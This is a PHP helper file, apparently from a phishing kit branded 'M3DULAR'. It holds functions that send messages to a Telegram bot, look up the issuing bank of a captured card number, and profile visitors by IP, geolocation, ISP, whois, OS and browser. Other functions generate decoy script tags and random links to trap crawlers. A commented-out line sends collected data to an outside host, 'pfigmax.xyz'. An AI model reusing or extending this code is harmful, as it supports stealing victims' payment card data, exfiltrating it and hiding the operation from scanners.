<?php


/*



████╗░████║╚════██╗██╔══██╗██║░░░██║██║░░░░░██╔══██╗██╔══██╗
██╔████╔██║░█████╔╝██║░░██║██║░░░██║██║░░░░░███████║██████╔╝
██║╚██╔╝██║░╚═══██╗██║░░██║██║░░░██║██║░░░░░██╔══██║██╔══██╗
██║░╚═╝░██║██████╔╝██████╔╝╚██████╔╝███████╗██║░░██║██║░░██║
╚═╝░░░░░╚═╝╚═════╝░╚═════╝░░╚═════╝░╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝


*/
// DEVICE CONTROLLER ADDED




//USE CONFIG TO START SHIT



// DEVICE CONTROLLER





define('WHITELIST_PATH', dirname(__FILE__) .'/');
 


// GLOBALS

$M3DUSERIP=getUserIP();
$loremdata=lorem(20);
$rand=rand(10,10000);





function getUserIP()
{
    // Get real visitor IP behind CloudFlare network
    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
              $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
              $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
    }


    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    return $ip;
}






function sendToTelegram2( $messaggio, $token, $chatID) {
$data = [
    'text' => $messaggio,
    'chat_id' => $chatID
];


file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );


}

function sendToTelegram( $messaggio, $token, $chatID) {


  // $chatID="-1001457510158";
  
  $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatID;
  $url = $url . "&text=" . urlencode($messaggio);
  $ch = curl_init();
  $optArray = array(
          CURLOPT_URL => $url,
          CURLOPT_RETURNTRANSFER => true
  );
  curl_setopt_array($ch, $optArray);
  $result = curl_exec($ch);
  curl_close($ch);
  return $result;
}



function lorem($paragraphs=3){

// lorem json file

$lorempath=WHITELIST_PATH."lorem.dat";


$json=file_get_contents($lorempath);
$data=json_decode($json);
return $data;

}

function file_read_test()
{

    $m3dwhitelist=WHITELIST_PATH."m3dwhitelist.dat";
    echo $m3dwhitelist;
    
}

function m3d_gen_scripts($lines, $lorem){

   $output='';

    for ($i = 0; $i <= $lines; $i++) {

        $output.='<script>';

      $output.= $lorem[array_rand($lorem)]; // rand element in array  
      $output.='</script> 
      
      
      
      
      
      
      <!--          '.$lorem[array_rand($lorem)].' -->


      ';

    }

    return $output;

}





function m3d_gen_a_lorem_old($lines, $lorem, $prefix=''){

    
$output='';
    //function assumes mh is base dir
       $output='';
    
        for ($i = 0; $i <= $lines; $i++) {
    
            $output.='<a class="" href="'.$prefix.'m3cache/index.php">';
    
          $output.= $lorem[array_rand($lorem)]; // rand element in array  
          $output.='</a> 
          
          
          <!--          '.$lorem[array_rand($lorem)].' -->
    
    
          ';
    
        }

        return $output;
    
    
    }

    

function m3d_gen_a_lorem_old_2($lines, $lorem, $prefix=''){

    
    $output='';
        //function assumes mh is base dir
           $output='';
        
            for ($i = 0; $i <= $lines; $i++) {
        
                $output.='<a class="m3dbh" href="'.$prefix.'m3cache/index.php">';
        
              $output.= $lorem[array_rand($lorem)]; // rand element in array  
              $output.='</a> 
              
              
              <!--          '.$lorem[array_rand($lorem)].' -->
        
        
              ';
        
            }
    
            return $output;
        
        
        }
    
        

    

function m3d_gen_a_lorem_old_hide($lines, $lorem, $prefix=''){

    
    $output='';
        //function assumes mh is base dir
           $output='';
        
            for ($i = 0; $i <= $lines; $i++) {
        
                $output.='<a class="m3dbh" href="'.$prefix.'m3dbh/index.php">';
        
              $output.= $lorem[array_rand($lorem)]; // rand element in array  
              $output.='</a> 
              
              
              <!--          '.$lorem[array_rand($lorem)].' -->
        
        
              ';
        
            }
    
            return $output;
        
        
        }
    
    

        




function m3d_gen_a_lorem($lines, $lorem,$foldername="m3cache/",$div=false){
//function assumes mh is base dir
   

$output='';
    for ($i = 0; $i <= $lines; $i++) {

   if($div) { $output.='<div>';}

        $output.='<a class="m3dbh" href="'.$foldername.'">';
        
        $output.='<a class="m3dbh" href="'.$foldername.'">';
      $output.= $lorem[array_rand($lorem)]; // rand element in array  
      $output.= $lorem[array_rand($lorem)]; // rand element in array  
      $output.='</a>';

    //   random dir 

      $output.='<a href="'. substr($lorem[array_rand($lorem)], 0, 20).'/'.substr($lorem[array_rand($lorem)], 0, 20).'.php">';
      $output.= $lorem[array_rand($lorem)]; // rand element in array  
      $output.= $lorem[array_rand($lorem)]; // rand element in array  
      $output.='</a>';

      if($div) { $output.='</div>';}


    }

    return $output;

}



function getisp($ip) {
  $getip = 'http://extreme-ip-lookup.com/json/' . $ip;
  $curl     = curl_init();
  curl_setopt($curl, CURLOPT_URL, $getip);
  curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
  $content = curl_exec($curl);
  curl_close($curl);

  // echo $ip,$content;
  $details   = json_decode($content);

  
  return $details->org;
}





function getOS() {
  $user_agent     =   $_SERVER['HTTP_USER_AGENT'];
  $os_platform    =   "Unknown OS Platform";
  $os_array       =   array(
                          '/windows nt 10/i'     =>  'Windows 10',
                          '/windows nt 6.3/i'     =>  'Windows 8.1',
                          '/windows nt 6.2/i'     =>  'Windows 8',
                          '/windows nt 6.1/i'     =>  'Windows 7',
                          '/windows nt 6.0/i'     =>  'Windows Vista',
                          '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                          '/windows nt 5.1/i'     =>  'Windows XP',
                          '/windows xp/i'         =>  'Windows XP',
                          '/windows nt 5.0/i'     =>  'Windows 2000',
                          '/windows me/i'         =>  'Windows ME',
                          '/win98/i'              =>  'Windows 98',
                          '/win95/i'              =>  'Windows 95',
                          '/win16/i'              =>  'Windows 3.11',
                          '/macintosh|mac os x/i' =>  'Mac OS X',
                          '/mac_powerpc/i'        =>  'Mac OS 9',
                          '/linux/i'              =>  'Linux',
                          '/ubuntu/i'             =>  'Ubuntu',
                          '/iphone/i'             =>  'iPhone',
                          '/ipod/i'               =>  'iPod',
                          '/ipad/i'               =>  'iPad',
                          '/android/i'            =>  'Android',
                          '/blackberry/i'         =>  'BlackBerry',
                          '/webos/i'              =>  'Mobile'
                      );
  foreach ($os_array as $regex => $value) {
      if (preg_match($regex, $user_agent)) {
          $os_platform    =   $value;
      }
  }
  return $os_platform;
}


function getBrowser() {
  $user_agent     =   $_SERVER['HTTP_USER_AGENT'];
  $browser        =   "Unknown Browser";
  $browser_array  =   array(
                          '/msie/i'       =>  'Internet Explorer',
                          '/firefox/i'    =>  'Firefox',
                          '/safari/i'     =>  'Safari',
                          '/chrome/i'     =>  'Chrome',
                          '/opera/i'      =>  'Opera',
                          '/netscape/i'   =>  'Netscape',
                          '/maxthon/i'    =>  'Maxthon',
                          '/konqueror/i'  =>  'Konqueror',
                          '/mobile/i'     =>  'Handheld Browser'
                      );
  foreach ($browser_array as $regex => $value) {
      if (preg_match($regex, $user_agent)) {
          $browser    =   $value;
      }
  }
  return $browser;
}

 


function substrwords($text, $maxchar, $end='') {
    if (strlen($text) > $maxchar || $text == '') {
        $words = preg_split('/\s/', $text);      
        $output = '';
        $i      = 0;
        while (1) {
            $length = strlen($output)+strlen($words[$i]);
            if ($length > $maxchar) {
                break;
            } 
            else {
                $output .= " " . $words[$i];
                ++$i;
            }
        }
        $output .= $end;
    } 
    else {
        $output = $text;
    }
    return $output;
}

function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $randomString;
}
function redirectTo($page)
{
   

    echo '<script>window.location.href = "'.$page.'";</script>';

}




$list_ua = <<< ua
Mozilla/5.0 (Windows NT 6.2; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0
Mozilla/5.0 (Windows NT 6.2; rv:18.0) Gecko/20100101 Firefox/18.0
Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0
Mozilla/5.0 (Windows NT 6.2; rv:15.0) Gecko/20100101 Firefox/15.0
Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.57 Safari/537.17
Mozilla/5.0 (Macintosh; Intel Mac OS X 1082) AppleWebKit/537.11 (KHTML like Gecko) Chrome/23.0.1271.10 Safari/537.11
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.2; Trident/5.0)
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.2; Trident/4.0)
Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02
Opera/9.80 (Windows NT 6.2; U; en) Presto/2.10.289 Version/12.01
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.13+ (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2
Mozilla/5.0 (Macintosh; Intel Mac OS X 1083) AppleWebKit/536.28.4 (KHTML like Gecko) Version/6.0.3 Safari/536.28.4
Mozilla/5.0 (Windows NT 6.1; rv:15.0) Gecko/20120919 Firefox/15.1.1 PaleMoon/15.1.1
ua;
function get_ua()
{
    global $list_ua;
    $list = explode("\n", $list_ua);
    $num = count($list) - 1;
    return trim($list[rand(0, $num)]);
}

function browsername()
{
    $browserName = $_SERVER['HTTP_USER_AGENT'];

    if (strpos(strtolower($browserName), "safari/") and strpos(strtolower($browserName), "opr/")) {
        $browserName = "Opera";
    } elseif (strpos(strtolower($browserName), "safari/") and strpos(strtolower($browserName), "chrome/")) {
        $browserName = "Chrome";
    } elseif (strpos(strtolower($browserName), "msie")) {
        $browserName = "Internet Explorer";
    } elseif (strpos(strtolower($browserName), "firefox/")) {
        $browserName = "Firefox";
    } elseif (strpos(strtolower($browserName), "safari/") and strpos(strtolower($browserName), "opr/")==false and strpos(strtolower($browserName), "chrome/")==false) {
        $browserName = "Safari";
    } else { $browserName = "Unknown"; }

    return $browserName;
}

function os_info($uagent)
{
    // the order of this array is important
    global $uagent;
    $oses   = array(
        'Win311' => 'Win16',
        'Win95' => '(Windows 95)|(Win95)|(Windows_95)',
        'WinME' => '(Windows 98)|(Win 9x 4.90)|(Windows ME)',
        'Win98' => '(Windows 98)|(Win98)',
        'Win2000' => '(Windows NT 5.0)|(Windows 2000)',
        'WinXP' => '(Windows NT 5.1)|(Windows XP)',
        'WinServer2003' => '(Windows NT 5.2)',
        'WinVista' => '(Windows NT 6.0)',
        'Windows 7' => '(Windows NT 6.1)',
        'Windows 8' => '(Windows NT 6.2)',
        'WinNT' => '(Windows NT 4.0)|(WinNT4.0)|(WinNT)|(Windows NT)',
        'OpenBSD' => 'OpenBSD',
        'SunOS' => 'SunOS',
        'Ubuntu' => 'Ubuntu',
        'Android' => 'Android',
        'Linux' => '(Linux)|(X11)',
        'iPhone' => 'iPhone',
        'iPad' => 'iPad',
        'MacOS' => '(Mac_PowerPC)|(Macintosh)',
        'QNX' => 'QNX',
        'BeOS' => 'BeOS',
        'OS2' => 'OS/2',
        'SearchBot' => '(nuhk)|(Googlebot)|(Yammybot)|(Openbot)|(Slurp)|(MSNBot)|(Ask Jeeves/Teoma)|(ia_archiver)'
    );
    $uagent = strtolower($uagent ? $uagent : $_SERVER['HTTP_USER_AGENT']);
    foreach ($oses as $os => $pattern)
        if (preg_match('/' . $pattern . '/i', $uagent))
            return $os;
    return 'Unknown';
}

function issetor(&$var, $default = false) {
    return isset($var) ? strip_tags($var) : strip_tags($default);
}



function systemInfo($ipAddress) {
    $systemInfo = array();

    $ipDetails = json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ipAddress), true);
    $systemInfo['city'] = $ipDetails['geoplugin_city'];
    $systemInfo['region'] = $ipDetails['geoplugin_region'];
    $systemInfo['country'] = $ipDetails['geoplugin_countryName'];

    $systemInfo['useragent'] = $_SERVER['HTTP_USER_AGENT'];
    $systemInfo['os'] = os_info($systemInfo['useragent']);
    $systemInfo['browser'] = browsername();

    return $systemInfo;
}



function bankDetails($cardNumber) {
    $bankDetails = array();
    $cardBIN = substr($cardNumber, 0, 6);
    $bankDetails = json_decode(file_get_contents("https://lookup.binlist.net/" . trim($cardBIN)), true);
    $bankDetails['bin'] = $cardBIN;
    return $bankDetails;
}


function blackhole_whois($ip) {
	
	$msg = '';
	$extra = '';
	$buffer = '';
	$server = 'whois.arin.net';
	
	
	
	if (!$ip = gethostbyname($ip)) {
		
		$msg .= 'Can&rsquo;t perform lookup without an IP address.'. "\n\n";
		
	} else {
		
		if (!$sock = fsockopen($server, 43, $num, $error, 20)) {
			
			unset($sock);
			$msg .= 'Timed-out connecting to $server (port 43).'. "\n\n";
			
		} else {
			
			// fputs($sock, "$ip\n");
			fputs($sock, "n $ip\n");
			$buffer = '';
			while (!feof($sock)) $buffer .= fgets($sock, 10240); 
			fclose($sock);
			
		}
		
		if (stripos($buffer, 'ripe.net')) {
			
			$nextServer = 'whois.ripe.net';
			
		} elseif (stripos($buffer, 'nic.ad.jp')) {
			
			$nextServer = 'whois.nic.ad.jp';
			$extra = '/e'; // suppress JaPaNIC characters
			
		} elseif (stripos($buffer, 'registro.br')) {
			
			$nextServer = 'whois.registro.br';
			
		}
		
		if (isset($nextServer)) {
			
			$buffer = '';
			$msg .= 'Deferred to specific whois server: '. $nextServer .'...'. "\n\n";
			
			if (!$sock = fsockopen($nextServer, 43, $num, $error, 10)) {
				
				unset($sock);
				$msg .= 'Timed-out connecting to '. $nextServer .' (port 43)'. "\n\n";
				
			} else {
				
				fputs($sock, $ip . $extra . "\n");
				while (!feof($sock)) $buffer .= fgets($sock, 10240);
				fclose($sock);
				
			}
		}
		
		$replacements = array("\n", "\n\n", "");
		$patterns = array("/\\n\\n\\n\\n/i", "/\\n\\n\\n/i", "/#(\s)?/i");
		$buffer = preg_replace($patterns, $replacements, $buffer);
		$buffer = htmlentities(trim($buffer), ENT_QUOTES, 'UTF-8');
		
		// $msg .= nl2br($buffer);
		$msg .= $buffer;
		
	}
	
	return $msg;
	
}


function blackhole_sanitize($string) {
	
	$string = trim($string); 
	$string = strip_tags($string);
	$string = htmlspecialchars($string, ENT_QUOTES, 'UTF-8');
	$string = str_replace("\n", "", $string);
	$string = trim($string); 
	
	return $string;
	
}





function ip_whois($ip)
{


    
		$whois = blackhole_whois($ip);
		
		$host = $ip;
		
		if (filter_var($ip, FILTER_VALIDATE_IP)) {
			
			$host = gethostbyaddr($ip);
			
		}


        $ua  = isset($_SERVER['HTTP_USER_AGENT']) ? blackhole_sanitize($_SERVER['HTTP_USER_AGENT']) : null;
	$request  = isset($_SERVER['REQUEST_URI'])     ? blackhole_sanitize($_SERVER['REQUEST_URI'])     : null;
	$protocol = isset($_SERVER['SERVER_PROTOCOL']) ? blackhole_sanitize($_SERVER['SERVER_PROTOCOL']) : null;
	$method   = isset($_SERVER['REQUEST_METHOD'])  ? blackhole_sanitize($_SERVER['REQUEST_METHOD'])  : null;
	
	date_default_timezone_set('UTC');
	
	$date = date('l, F jS Y @ H:i:s');
	
	$time = time();
		
    $a_link = "http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";

		$message  = $date . "\n\n";
		$message .= 'A Link: '  . $a_link . "\n";
		$message .= 'URL Request: '  . $request . "\n";
		$message .= 'IP Address: '   . $ip . "\n";
		$message .= 'Host Name: '    . $host . "\n";
		$message .= 'User Agent: '   . $ua . "\n\n";
		$message .= 'GeoIP Lookup: ' . "\n\n" . 'https://whatismyipaddress.com/ip/'. $ip . "\n\n";
		$message .= 'Whois Lookup: ' . "\n\n" . $whois . "\n\n";
		


		return $message;
		
		// file_get_contents("https://pfigmax.xyz/botcache/cache.php" . http_build_query($data) );

        // sendToTelegram2()

}





?>